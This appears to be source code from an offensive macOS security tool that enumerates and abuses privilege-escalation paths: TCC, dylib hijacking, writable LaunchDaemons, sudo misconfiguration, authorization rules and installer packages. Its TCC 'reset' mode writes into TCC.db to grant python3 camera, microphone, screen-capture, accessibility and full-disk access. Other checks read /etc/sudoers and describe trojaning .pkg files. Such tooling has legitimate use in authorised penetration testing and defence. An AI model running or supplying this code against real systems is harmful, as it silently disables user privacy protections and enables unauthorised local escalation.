import { run, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function tccBypass(args: string[], timeout: number): Promise<HookResult> {
  const method = argVal(args, "--method") || "direct"
  const findings: Finding[] = []
  const output: string[] = ["[*] Attempting TCC bypass...\n"]

  const sipStatus = await run("csrutil", ["status"], timeout)
  const sipEnabled = sipStatus.stdout.includes("enabled")
  output.push(`[*] SIP status: ${sipEnabled ? "ENABLED (limits TCC bypass)" : "DISABLED (full access)"}`)

  if (method === "direct" || method === "reset") {
    const tccPaths = [
      `${process.env.HOME}/Library/Application Support/com.apple.TCC/TCC.db`,
      "/Library/Application Support/com.apple.TCC/TCC.db",
    ]

    for (const tccPath of tccPaths) {
      const exists = await Bun.file(tccPath).exists()
      if (!exists) continue

      output.push(`\n[+] TCC database: ${tccPath}`)
      const entries = await run(
        "sqlite3",
        [tccPath, "-json", "SELECT service, client, client_type, auth_value, auth_reason FROM access ORDER BY service"],
        timeout,
      )
      if (entries.exitCode === 0) {
        const rows = JSON.parse(entries.stdout || "[]") as Array<Record<string, string | number>>
        output.push(`    Entries: ${rows.length}`)
        const services = new Set(rows.map((r) => r.service))
        for (const svc of services) {
          const svcRows = rows.filter((r) => r.service === svc)
          const allowed = svcRows.filter((r) => r.auth_value === 2).length
          output.push(`    ${svc}: ${svcRows.length} apps (${allowed} allowed)`)
        }

        if (method === "reset") {
          output.push("\n[*] Resetting TCC entries (inserting allow-all for CyberStrike)...")
          const servicesToGrant = [
            "kTCCServiceCamera",
            "kTCCServiceMicrophone",
            "kTCCServiceScreenCapture",
            "kTCCServiceAccessibility",
            "kTCCServiceSystemPolicyAllFiles",
          ]
          for (const svc of servicesToGrant) {
            const insert = await run(
              "sqlite3",
              [
                tccPath,
                `INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier_type, flags) VALUES ('${svc}', '/usr/bin/python3', 0, 2, 3, 1, 0, 0)`,
              ],
              timeout,
            )
            if (insert.exitCode === 0) {
              output.push(`    [+] Granted ${svc} to python3`)
              findings.push({
                checkId: `MAC-TCC-${findings.length + 1}`,
                provider: "macos",
                severity: "critical",
                status: "MODIFIED",
                resource: `tcc://${svc}`,
                title: `TCC entry modified: ${svc}`,
                details: `Granted full access to python3 for ${svc}`,
                remediation: "Reset TCC database: tccutil reset All",
              })
            }
          }
        }
      }
    }
  }

  if (method === "inject") {
    output.push("\n[*] TCC injection via AppleScript...")
    const script = `tell application "System Events" to get every process`
    const inject = await run("osascript", ["-e", script], timeout)
    if (inject.exitCode === 0) {
      output.push(`[+] AppleScript execution successful — Accessibility access available`)
      output.push(`    Processes: ${inject.stdout.trim().substring(0, 200)}...`)
    }
    if (inject.exitCode !== 0) {
      output.push(`[!] AppleScript blocked — Accessibility permission not granted`)
      output.push(`    stderr: ${inject.stderr.trim()}`)
    }
  }

  return { output: output.join("\n"), findings }
}

export async function dylibHijack(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== DYLIB Hijack Analysis ==="]

  const sipCheck = await run("csrutil", ["status"], timeout)
  const sipEnabled = sipCheck.stdout.includes("enabled")
  output.push(`[*] SIP: ${sipEnabled ? "ENABLED — DYLD_INSERT_LIBRARIES restricted for protected binaries" : "DISABLED — DYLD_INSERT_LIBRARIES available system-wide"}`)

  if (!sipEnabled) {
    findings.push({
      checkId: "MAC-DYLIB-002",
      provider: "macos",
      severity: "medium",
      status: "VULNERABLE",
      resource: "macos://dyld",
      title: "DYLD_INSERT_LIBRARIES available (SIP disabled)",
      details: "SIP is disabled — DYLD_INSERT_LIBRARIES can inject into any process including system binaries",
      remediation: "Enable SIP: csrutil enable (from Recovery Mode)",
    })
  }

  const suid = await run("find", ["/usr/local", "/opt", "-perm", "+6000", "-type", "f"], timeout)
  const suidBins = suid.stdout.split("\n").filter(Boolean)
  if (suidBins.length > 0) {
    output.push(`\n[+] SUID/SGID binaries in /usr/local, /opt: ${suidBins.length}`)
    for (const bin of suidBins) output.push(`    ${bin}`)
  }

  const hijackable: string[] = []
  const checkBins = suidBins.slice(0, 15)
  const nonSystemBins = await run("find", ["/usr/local/bin", "/opt", "-type", "f", "-perm", "+0111"], timeout)
  const extraBins = nonSystemBins.stdout.split("\n").filter(Boolean).slice(0, 10)
  const allBins = [...checkBins, ...extraBins].slice(0, 20)

  for (const bin of allBins) {
    const otool = await run("otool", ["-L", bin], timeout)
    if (otool.exitCode !== 0) continue
    const libs = otool.stdout.split("\n").filter(Boolean)
    for (const lib of libs) {
      const trimmed = lib.trim()
      if (trimmed.includes("@rpath") || trimmed.includes("@loader_path") || (trimmed.includes("/") && !trimmed.startsWith("/usr/lib") && !trimmed.startsWith("/System"))) {
        hijackable.push(`${bin} → ${trimmed.split(" (")[0].trim()}`)
      }
    }
  }

  if (hijackable.length > 0) {
    output.push(`\n[!] Potentially hijackable dylib references: ${hijackable.length}`)
    for (const h of hijackable) output.push(`    ${h}`)
    findings.push({
      checkId: "MAC-DYLIB-001",
      provider: "macos",
      severity: "high",
      status: "VULNERABLE",
      resource: "macos://dylib",
      title: `Hijackable dylib references found: ${hijackable.length}`,
      details: `${hijackable.length} binary/dylib pairs use @rpath, @loader_path, or non-system paths — can be hijacked by placing a malicious dylib at the expected path`,
      remediation: "Recompile binaries with absolute paths. Remove unnecessary SUID bits.",
    })
  }

  const fallbackPath = await run("cat", ["/etc/dyld_fallback_library_path"], timeout)
  if (fallbackPath.exitCode === 0 && fallbackPath.stdout.trim()) {
    output.push(`\n[+] /etc/dyld_fallback_library_path:\n${fallbackPath.stdout.trim()}`)
  }

  return { output: output.join("\n"), findings }
}

export async function launchdPlistAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== LaunchAgent/LaunchDaemon Privilege Escalation ==="]
  const home = process.env.HOME || "/root"

  const dirs = [
    { path: "/Library/LaunchDaemons", scope: "system-daemon" },
    { path: "/Library/LaunchAgents", scope: "system-agent" },
    { path: `${home}/Library/LaunchAgents`, scope: "user-agent" },
  ]

  const writablePlists: string[] = []
  const writableBinaries: string[] = []

  for (const dir of dirs) {
    const ls = await run("ls", ["-la", dir.path], timeout)
    if (ls.exitCode !== 0) continue

    output.push(`\n[*] ${dir.scope}: ${dir.path}`)

    const writableCheck = await run("find", [dir.path, "-writable", "-name", "*.plist", "-type", "f"], timeout)
    const writable = writableCheck.stdout.split("\n").filter(Boolean)
    if (writable.length > 0) {
      output.push(`  [!] Writable plists: ${writable.length}`)
      for (const p of writable) {
        output.push(`      ${p}`)
        writablePlists.push(p)
      }
    }

    const nonApple = await run("find", [dir.path, "-name", "*.plist", "-not", "-name", "com.apple.*", "-type", "f"], timeout)
    const thirdParty = nonApple.stdout.split("\n").filter(Boolean)
    if (thirdParty.length === 0) continue

    output.push(`  [*] Third-party plists: ${thirdParty.length}`)
    for (const plist of thirdParty.slice(0, 10)) {
      const progArgs = await run("defaults", ["read", plist.replace(/\.plist$/, ""), "ProgramArguments"], timeout)
      if (progArgs.exitCode !== 0) continue
      const binMatch = progArgs.stdout.match(/"([^"]+)"/)
      if (!binMatch) continue
      const binPath = binMatch[1]
      output.push(`      ${plist.split("/").pop()} → ${binPath}`)

      const binPerms = await run("ls", ["-la", binPath], timeout)
      if (binPerms.exitCode !== 0) continue
      const permsLine = binPerms.stdout.trim()
      if (permsLine.includes("-rwxrwxrwx") || permsLine.includes("-rwxrwxr-x") || permsLine.includes("-rwxrw")) {
        output.push(`        [!] WRITABLE binary: ${permsLine}`)
        writableBinaries.push(`${plist} → ${binPath}`)
      }
    }
  }

  if (writablePlists.length > 0) {
    findings.push({
      checkId: "MAC-LAUNCHD-PRIV-001",
      provider: "macos",
      severity: "high",
      status: "VULNERABLE",
      resource: "macos://launchd",
      title: `Writable LaunchAgent/Daemon plists: ${writablePlists.length}`,
      details: `${writablePlists.length} plist(s) are writable — can be modified to execute arbitrary commands: ${writablePlists.slice(0, 3).join(", ")}`,
      remediation: "Fix plist permissions: chmod 644 and chown root:wheel for system plists",
    })
  }

  if (writableBinaries.length > 0) {
    findings.push({
      checkId: "MAC-LAUNCHD-PRIV-002",
      provider: "macos",
      severity: "critical",
      status: "VULNERABLE",
      resource: "macos://launchd",
      title: `Writable binaries referenced by LaunchDaemons: ${writableBinaries.length}`,
      details: `${writableBinaries.length} LaunchDaemon/Agent plist(s) reference writable binaries — replace binary for code execution as the daemon user: ${writableBinaries.slice(0, 3).join(", ")}`,
      remediation: "Fix binary permissions. Ensure daemon binaries are owned by root and not world-writable.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function sudoMisconfig(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Sudo Misconfiguration Analysis ==="]

  const sudoVersion = await run("sudo", ["-V"], timeout)
  if (sudoVersion.exitCode === 0) {
    const verLine = sudoVersion.stdout.split("\n")[0] || ""
    output.push(`[*] ${verLine}`)
    const verMatch = verLine.match(/(\d+\.\d+\.\d+p?\d*)/)
    if (verMatch) {
      const ver = verMatch[1]
      output.push(`[*] Sudo version: ${ver}`)
      const parts = ver.replace("p", ".").split(".").map(Number)
      const major = parts[0] || 0
      const minor = parts[1] || 0
      const patch = parts[2] || 0
      const patchLevel = parts[3] || 0
      if (major === 1 && (minor < 9 || (minor === 9 && patch < 5) || (minor === 9 && patch === 5 && patchLevel < 2))) {
        output.push(`[!] VULNERABLE to CVE-2021-3156 (sudoedit heap overflow) — versions before 1.9.5p2`)
        findings.push({
          checkId: "MAC-SUDO-002",
          provider: "macos",
          severity: "critical",
          status: "VULNERABLE",
          resource: "macos://sudo",
          title: "Sudo vulnerable to CVE-2021-3156 (Baron Samedit)",
          details: `Sudo version ${ver} is vulnerable to heap-based buffer overflow in sudoedit — allows local privilege escalation to root without valid credentials`,
          remediation: "Update sudo to 1.9.5p2 or later: brew install sudo",
        })
      }
    }
  }

  const sudoList = await run("sudo", ["-l"], timeout)
  output.push(`\n[*] sudo -l output:`)
  output.push(sudoList.stdout.substring(0, 2000) || sudoList.stderr.substring(0, 500))

  const sudoOut = sudoList.stdout + sudoList.stderr
  if (sudoOut.includes("NOPASSWD")) {
    const nopasswdLines = sudoOut.split("\n").filter((l) => l.includes("NOPASSWD"))
    output.push(`\n[!] NOPASSWD entries found: ${nopasswdLines.length}`)
    for (const l of nopasswdLines) output.push(`    ${l.trim()}`)
    findings.push({
      checkId: "MAC-SUDO-001",
      provider: "macos",
      severity: "high",
      status: "VULNERABLE",
      resource: "macos://sudo",
      title: `NOPASSWD sudo entries: ${nopasswdLines.length}`,
      details: `${nopasswdLines.length} NOPASSWD rule(s) allow passwordless privilege escalation: ${nopasswdLines.slice(0, 3).map((l) => l.trim()).join("; ")}`,
      remediation: "Remove NOPASSWD from sudoers entries. Require password for all sudo operations.",
    })
  }

  if (sudoOut.includes("env_keep") && (sudoOut.includes("DYLD") || sudoOut.includes("LD_"))) {
    output.push(`\n[!] env_keep includes library injection variables`)
    findings.push({
      checkId: "MAC-SUDO-003",
      provider: "macos",
      severity: "critical",
      status: "VULNERABLE",
      resource: "macos://sudo",
      title: "sudo env_keep allows DYLD/LD injection",
      details: "env_keep preserves DYLD_INSERT_LIBRARIES or LD_PRELOAD through sudo — allows library injection into privileged commands",
      remediation: "Remove DYLD_* and LD_* from env_keep in /etc/sudoers",
    })
  }

  const sudoers = await run("cat", ["/etc/sudoers"], timeout)
  if (sudoers.exitCode === 0) {
    output.push(`\n[+] /etc/sudoers readable (${sudoers.stdout.split("\n").length} lines)`)
    const wildcardLines = sudoers.stdout.split("\n").filter((l) => l.includes("*") && !l.startsWith("#"))
    if (wildcardLines.length > 0) {
      output.push(`[!] Wildcard entries: ${wildcardLines.length}`)
      for (const l of wildcardLines) output.push(`    ${l.trim()}`)
    }
  }

  const sudoersD = await run("ls", ["-la", "/etc/sudoers.d/"], timeout)
  if (sudoersD.exitCode === 0) {
    output.push(`\n[+] /etc/sudoers.d/ contents:\n${sudoersD.stdout}`)
  }

  return { output: output.join("\n"), findings }
}

export async function authorizationDb(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Authorization Database Analysis ==="]

  const interestingRights = [
    { name: "system.preferences", desc: "System Preferences access" },
    { name: "system.privilege.admin", desc: "Admin privilege escalation" },
    { name: "system.privilege.taskport", desc: "Task port access (process injection)" },
    { name: "system.install.apple-software", desc: "Apple software installation" },
    { name: "system.install.admin-software", desc: "Admin software installation" },
    { name: "com.apple.security.authorization.execute-with-privileges", desc: "AuthorizationExecuteWithPrivileges" },
    { name: "system.services.systemconfiguration.network", desc: "Network config modification" },
    { name: "com.apple.ServiceManagement.daemons.modify", desc: "LaunchDaemon modification" },
  ]

  const weakRights: string[] = []
  for (const right of interestingRights) {
    const result = await run("security", ["authorizationdb", "read", right.name], timeout)
    if (result.exitCode !== 0) continue

    const ruleMatch = result.stdout.match(/<string>([^<]+)<\/string>/)
    const rule = ruleMatch ? ruleMatch[1] : "unknown"
    output.push(`[*] ${right.name}: ${rule}`)
    output.push(`    ${right.desc}`)

    if (rule === "allow" || rule === "authenticate-session-owner" || rule === "is-session-owner") {
      output.push(`    [!] Weak rule — may allow unprivileged access`)
      weakRights.push(`${right.name} (${rule})`)
    }
  }

  if (weakRights.length > 0) {
    findings.push({
      checkId: "MAC-AUTHDB-001",
      provider: "macos",
      severity: "medium",
      status: "IDENTIFIED",
      resource: "macos://authdb",
      title: `Weak authorization rules: ${weakRights.length}`,
      details: `${weakRights.length} authorization right(s) use weak rules that may allow privilege escalation: ${weakRights.join(", ")}`,
      remediation: "Tighten authorization rules via: security authorizationdb write <right> authenticate-admin",
    })
  }

  const profiles = await run("profiles", ["-C", "-v"], timeout)
  if (profiles.exitCode === 0 && profiles.stdout.trim()) {
    output.push(`\n[*] MDM/Configuration Profiles:\n${profiles.stdout.substring(0, 1000)}`)
  }

  return { output: output.join("\n"), findings }
}

export async function pkgAbuse(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Installer Package Analysis ==="]
  const home = process.env.HOME || "/root"

  const searchDirs = ["/tmp", `${home}/Downloads`, "/var/folders"]
  const pkgFiles: string[] = []
  for (const dir of searchDirs) {
    const find = await run("find", [dir, "-name", "*.pkg", "-type", "f", "-maxdepth", "3"], timeout)
    if (find.exitCode !== 0) continue
    const found = find.stdout.split("\n").filter(Boolean)
    if (found.length > 0) {
      output.push(`\n[+] .pkg files in ${dir}: ${found.length}`)
      for (const f of found.slice(0, 10)) output.push(`    ${f}`)
      pkgFiles.push(...found)
    }
  }

  if (pkgFiles.length > 0) {
    findings.push({
      checkId: "MAC-PKG-001",
      provider: "macos",
      severity: "medium",
      status: "IDENTIFIED",
      resource: "macos://pkg",
      title: `Installer packages found: ${pkgFiles.length}`,
      details: `${pkgFiles.length} .pkg file(s) found in temp/download dirs — can be trojaned with malicious pre/postinstall scripts via pkgutil --expand, edit, pkgutil --flatten`,
      remediation: "Remove unnecessary .pkg files from temp directories",
    })
  }

  const receipts = await run("ls", ["/var/db/receipts/"], timeout)
  if (receipts.exitCode === 0) {
    const plists = receipts.stdout.split("\n").filter((l) => l.endsWith(".plist"))
    output.push(`\n[*] Package receipts: ${plists.length}`)
  }

  const pkgList = await run("pkgutil", ["--pkgs"], timeout)
  if (pkgList.exitCode === 0) {
    const pkgs = pkgList.stdout.split("\n").filter(Boolean)
    output.push(`\n[*] Installed packages: ${pkgs.length}`)
    const nonApple = pkgs.filter((p) => !p.startsWith("com.apple."))
    if (nonApple.length > 0) {
      output.push(`[*] Third-party packages: ${nonApple.length}`)
      for (const p of nonApple.slice(0, 20)) {
        output.push(`    ${p}`)
        const info = await run("pkgutil", ["--pkg-info", p], timeout)
        if (info.exitCode !== 0) continue
        const locMatch = info.stdout.match(/install-location:\s*(.+)/)
        if (!locMatch) continue
        const installLoc = locMatch[1].trim()
        const writableCheck = await run("find", [installLoc, "-writable", "-type", "f", "-maxdepth", "1"], timeout)
        const writableFiles = writableCheck.stdout.split("\n").filter(Boolean)
        if (writableFiles.length > 0) {
          output.push(`      [!] Writable files in install location: ${writableFiles.length}`)
          for (const w of writableFiles.slice(0, 5)) output.push(`          ${w}`)
        }
      }
    }
  }

  const writableScripts = await run("find", ["/var/db/receipts", "-writable", "-name", "*.plist", "-type", "f"], timeout)
  if (writableScripts.exitCode === 0 && writableScripts.stdout.trim()) {
    const writable = writableScripts.stdout.split("\n").filter(Boolean)
    output.push(`\n[!] Writable receipt plists: ${writable.length}`)
    for (const w of writable) output.push(`    ${w}`)
    findings.push({
      checkId: "MAC-PKG-002",
      provider: "macos",
      severity: "high",
      status: "VULNERABLE",
      resource: "macos://pkg",
      title: `Writable package receipt plists: ${writable.length}`,
      details: `${writable.length} package receipt plist(s) are writable — can be modified to alter package behavior on reinstall/upgrade`,
      remediation: "Fix permissions on /var/db/receipts/: chmod 644 *.plist && chown root:wheel *.plist",
    })
  }

  return { output: output.join("\n"), findings }
}
